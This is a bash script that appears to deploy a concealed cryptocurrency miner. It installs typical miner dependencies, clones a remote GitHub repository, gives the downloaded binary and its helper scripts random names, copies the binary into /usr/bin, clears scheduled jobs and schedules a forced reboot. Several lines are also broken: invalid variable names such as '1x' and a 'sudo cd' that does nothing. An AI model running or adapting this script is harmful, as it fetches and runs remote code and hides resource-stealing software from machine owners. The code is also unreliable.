#!/bin/bash

ID="$(hostname)"

THREADS="$(nproc --all)"

for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + 12 hours

apt -y install gpw
apt -y install sudo



timer=$(gpw 1 11)
tmpfoldername=$(gpw 1 7)
softwarename=$(gpw 1 9)

1x=$(gpw 1 2)
2x=$(gpw 1 4)
3x=$(gpw 1 6)
4x=$(gpw 1 8)
5x=$(gpw 1 10)
6x=$(gpw 1 12)

#rm -rf /tmp/defaultsoft/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
sudo echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
sudo cd /tmp && mkdir $tmpfoldername
sudo git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
sudo cd /tmp/$tmpfoldername
sudo mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
sudo chmod +x /tmp/$tmpfoldername/$softwarename
sudo chmod 777 ./*.sh
sudo cp /tmp/$tmpfoldername/$softwarename /usr/bin/

##########################################################

sudo sed -i "s/defaultsoftwarename/$softwarename/g" 1.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" 2.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" 3.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" 4.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" 5.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" 6.sh

sudo mv 1.sh $1x.sh
sudo mv 2.sh $2x.sh
sudo mv 3.sh $3x.sh
sudo mv 4.sh $4x.sh
sudo mv 5.sh $5x.sh
sudo mv 6.sh $6x.sh
sleep 3


##########################################################

sudo sed -i "s/\<1\>/$1x/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<2\>/$2x/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<3\>/$3x/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<4\>/$4x/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<5\>/$5x/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<6\>/$6x/g" /tmp/$tmpfoldername/defaulttimer.sh

sudo mv /tmp/$tmpfoldername/defaulttimer.sh /tmp/$tmpfoldername/$timer.sh


##########################################################



##########################################################


sudo apt-get install dos2unix -y

sudo dos2unix $timer.sh
sudo dos2unix $4x.sh
sudo dos2unix $2x.sh
sudo dos2unix $5x.sh
sudo dos2unix $3x.sh
sudo dos2unix $6x.sh
sudo dos2unix $1x.sh

sudo ./$timer.sh & ./defaultchecker.sh


